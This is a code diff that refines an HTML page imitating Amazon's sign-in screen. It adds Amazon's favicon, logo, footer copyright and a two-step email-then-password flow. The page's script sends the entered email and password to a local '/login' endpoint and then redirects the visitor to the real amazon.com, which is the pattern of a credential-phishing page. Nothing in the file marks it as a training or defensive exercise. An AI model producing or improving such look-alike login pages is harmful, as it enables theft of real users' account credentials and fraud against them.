@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Amazon Sign-In</title>
+    <link rel="icon" href="https://www.amazon.com/favicon.ico">
     <style>
         body {
             font-family: "Amazon Ember", Arial, sans-serif;
@@ -12,25 +13,29 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding-top: 20px;
+            min-height: 100vh;
         }
         .logo {
-            margin-bottom: 20px;
+            margin-top: 14px;
+            margin-bottom: 18px;
         }
         .logo img {
             height: 31px;
+            width: 103px;
         }
-        .container {
+        .card {
             width: 350px;
             border: 1px solid #ddd;
             border-radius: 4px;
             padding: 20px 26px;
+            margin-bottom: 22px;
         }
         h1 {
             font-weight: 400;
             font-size: 28px;
             line-height: 1.2;
             margin-bottom: 10px;
+            margin-top: 0;
         }
         label {
             display: block;
@@ -38,21 +43,24 @@
             font-size: 13px;
             margin-bottom: 5px;
             margin-top: 10px;
+            color: #111;
         }
-        input[type="email"], input[type="password"] {
+        input[type="text"], input[type="password"], input[type="email"] {
             width: 100%;
-            padding: 8px;
+            padding: 7px 8px;
             margin-bottom: 10px;
             border: 1px solid #a6a6a6;
             border-radius: 3px;
             box-sizing: border-box;
+            font-size: 13px;
+            box-shadow: 0 1px 0 rgba(255,255,255,.5), 0 1px 0 rgba(0,0,0,.07) inset;
         }
-        input[type="email"]:focus, input[type="password"]:focus {
+        input:focus {
             border-color: #e77600;
             box-shadow: 0 0 3px 2px rgba(228, 121, 17, .5);
             outline: none;
         }
-        .submit-btn {
+        .btn-primary {
             width: 100%;
             background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
             border: 1px solid;
@@ -62,13 +70,14 @@
             padding: 6px;
             margin-top: 15px;
             font-size: 13px;
+            box-shadow: 0 1px 0 rgba(255,255,255,.4) inset;
         }
-        .submit-btn:hover {
+        .btn-primary:hover {
             background: linear-gradient(to bottom, #f5d78e, #eeb933);
         }
         .legal {
             font-size: 12px;
-            margin-top: 20px;
+            margin-top: 18px;
             line-height: 1.5;
             color: #111;
         }
@@ -80,12 +89,47 @@
             text-decoration: underline;
             color: #c45500;
         }
-        .new-to {
-            text-align: center;
-            margin-top: 20px;
-            position: relative;
+        .expander {
+            margin-top: 22px;
+            font-size: 13px;
         }
-        .new-to::before {
+        .expander-header {
+            color: #0066c0;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+        .expander-header::before {
+            content: "";
+            display: inline-block;
+            width: 0;
+            height: 0;
+            border-left: 4px solid transparent;
+            border-right: 4px solid transparent;
+            border-top: 4px solid #666; /* Down arrow initially */
+            margin-right: 5px;
+            transform: rotate(-90deg); /* Point right */
+            transition: transform 0.1s;
+        }
+        .expander-header.open::before {
+             transform: rotate(0deg); /* Point down */
+        }
+        .expander-content {
+            display: none;
+            margin-top: 5px;
+            margin-left: 10px;
+        }
+        .expander-content.open {
+            display: block;
+        }
+        .divider {
+            text-align: center;
+            margin-top: 26px;
+            margin-bottom: 14px;
+            position: relative;
+            width: 350px;
+        }
+        .divider::before {
             content: "";
             position: absolute;
             top: 50%;
@@ -94,13 +138,13 @@
             border-top: 1px solid #e7e7e7;
             z-index: -1;
         }
-        .new-to span {
+        .divider span {
             background: #fff;
-            padding: 0 10px;
+            padding: 0 8px;
             color: #767676;
             font-size: 12px;
         }
-        .create-btn {
+        .btn-create {
             display: block;
             width: 350px;
             text-align: center;
@@ -108,68 +152,226 @@
             border: 1px solid;
             border-color: #adb1b8 #a2a6ac #8d9096;
             border-radius: 3px;
-            padding: 6px;
-            margin-top: 10px;
+            padding: 7px;
             font-size: 13px;
             color: #111;
             text-decoration: none;
+            box-sizing: border-box;
+            box-shadow: 0 1px 0 rgba(255,255,255,.6) inset;
         }
-        .create-btn:hover {
+        .btn-create:hover {
             background: linear-gradient(to bottom, #e7eaf0, #d9dce1);
         }
+        .footer {
+            margin-top: auto;
+            width: 100%;
+            border-top: 1px solid #e7e7e7;
+            background: linear-gradient(to bottom, #fff, #fcfcfc);
+            padding: 26px 0;
+            text-align: center;
+            font-size: 11px;
+        }
+        .footer a {
+            color: #0066c0;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+            color: #c45500;
+        }
+        .footer p {
+            color: #555;
+            margin-top: 10px;
+        }
+        .hidden {
+            display: none;
+        }
+        .user-pill {
+            font-size: 13px;
+            margin-bottom: 10px;
+        }
+        .user-pill span {
+            margin-right: 5px;
+        }
+        .change-link {
+            color: #0066c0;
+            text-decoration: none;
+            font-size: 13px;
+            cursor: pointer;
+        }
+        .change-link:hover {
+            text-decoration: underline;
+            color: #c45500;
+        }
+        .error-box {
+            display: none;
+            border: 1px solid #d00;
+            border-radius: 4px;
+            box-shadow: 0 0 0 1px #d00 inset;
+            padding: 14px 18px;
+            margin-bottom: 18px;
+            width: 350px;
+            box-sizing: border-box;
+        }
+        .error-box-header {
+            color: #c40000;
+            font-size: 13px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+        }
+        .error-box-header svg {
+            fill: #c40000;
+            margin-right: 8px;
+        }
+        .error-box-message {
+            font-size: 13px;
+            margin-top: 5px;
+            margin-left: 26px;
+        }
     </style>
+</head>
+<body>
+
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
+    </div>
+
+    <div class="error-box" id="error-box">
+        <div class="error-box-header">
+            <svg width="18" height="18" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            <span>There was a problem</span>
+        </div>
+        <div class="error-box-message" id="error-message"></div>
+    </div>
+
+    <!-- Step 1: Email -->
+    <div class="card" id="step-1">
+        <h1>Sign in</h1>
+        <form onsubmit="handleEmailSubmit(event)">
+            <label for="email">Email or mobile phone number</label>
+            <input type="text" id="email" name="email" required>
+            
+            <button type="submit" class="btn-primary">Continue</button>
+            
+            <div class="legal">
+                By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
+            </div>
+            
+            <div class="expander">
+                <div class="expander-header" onclick="toggleHelp()">
+                    Need help?
+                </div>
+                <div class="expander-content" id="help-content">
+                    <div style="margin-bottom:5px;"><a href="#">Forgot your password?</a></div>
+                    <div><a href="#">Other issues with Sign-In</a></div>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <!-- Step 2: Password -->
+    <div class="card hidden" id="step-2">
+        <h1>Sign in</h1>
+        <div class="user-pill">
+            <span id="user-email-display">email@example.com</span>
+            <a class="change-link" onclick="goToStep1()">Change</a>
+        </div>
+        <form onsubmit="handlePasswordSubmit(event)">
+            <div style="display: flex; justify-content: space-between; align-items: baseline;">
+                <label for="password">Password</label>
+                <a href="#" style="font-size: 13px; color: #0066c0; text-decoration: none;">Forgot your password?</a>
+            </div>
+            <input type="password" id="password" name="password" required>
+            
+            <button type="submit" class="btn-primary">Sign in</button>
+            
+            <div style="margin-top: 14px; font-size: 13px; display: flex; align-items: center;">
+                <input type="checkbox" id="remember" style="width: auto; margin-right: 5px;">
+                <label for="remember" style="font-weight: 400; margin: 0;">Keep me signed in.</label>
+            </div>
+        </form>
+    </div>
+
+    <div class="divider" id="new-divider">
+        <span>New to Amazon?</span>
+    </div>
+    
+    <a href="#" class="btn-create" id="create-btn">Create your Amazon account</a>
+
+    <div class="footer">
+        <div>
+            <a href="#">Conditions of Use</a>
+            <a href="#">Privacy Notice</a>
+            <a href="#">Help</a>
+        </div>
+        <p>© 1996-2024, Amazon.com, Inc. or its affiliates</p>
+    </div>
+
     <script>
-        async function handleLogin(event) {
+        let userEmail = "";
+
+        function toggleHelp() {
+            const header = document.querySelector('.expander-header');
+            const content = document.getElementById('help-content');
+            header.classList.toggle('open');
+            content.classList.toggle('open');
+        }
+
+        function handleEmailSubmit(event) {
             event.preventDefault();
-            const form = event.target;
-            const formData = new FormData(form);
-            const data = Object.fromEntries(formData.entries());
+            const emailInput = document.getElementById('email');
+            if (emailInput.value) {
+                userEmail = emailInput.value;
+                document.getElementById('user-email-display').textContent = userEmail;
+                
+                // Switch to Step 2
+                document.getElementById('step-1').classList.add('hidden');
+                document.getElementById('step-2').classList.remove('hidden');
+                document.getElementById('new-divider').classList.add('hidden');
+                document.getElementById('create-btn').classList.add('hidden');
+                document.getElementById('error-box').style.display = 'none';
+                
+                // Focus password
+                setTimeout(() => document.getElementById('password').focus(), 100);
+            }
+        }
+
+        function goToStep1() {
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-1').classList.remove('hidden');
+            document.getElementById('new-divider').classList.remove('hidden');
+            document.getElementById('create-btn').classList.remove('hidden');
+            document.getElementById('error-box').style.display = 'none';
+        }
+
+        async function handlePasswordSubmit(event) {
+            event.preventDefault();
+            const password = document.getElementById('password').value;
             
             try {
                 const response = await fetch('/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify({
+                        email: userEmail,
+                        password: password
+                    })
                 });
                 
                 if (response.ok) {
                     window.location.href = "https://www.amazon.com";
+                } else {
+                    // Show error
+                    const errorBox = document.getElementById('error-box');
+                    document.getElementById('error-message').textContent = "Incorrect password";
+                    errorBox.style.display = 'block';
                 }
             } catch (error) {
                 console.error('Error:', error);
             }
         }
     </script>
-</head>
-<body>
-    <div class="logo">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/500px-Amazon_logo.svg.png" alt="Amazon">
-    </div>
-    <div class="container">
-        <h1>Sign in</h1>
-        <form id="login-form" onsubmit="handleLogin(event)">
-            <label for="email">Email or mobile phone number</label>
-            <input type="email" id="email" name="email" required>
-            
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" required>
-            
-            <button type="submit" class="submit-btn">Sign in</button>
-            
-            <div class="legal">
-                By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
-            </div>
-            
-            <div class="legal" style="margin-top: 20px;">
-                <a href="#">Need help?</a>
-            </div>
-        </form>
-    </div>
-    
-    <div class="new-to">
-        <span>New to Amazon?</span>
-    </div>
-    
-    <a href="#" class="create-btn">Create your Amazon account</a>
 </body>
 </html>
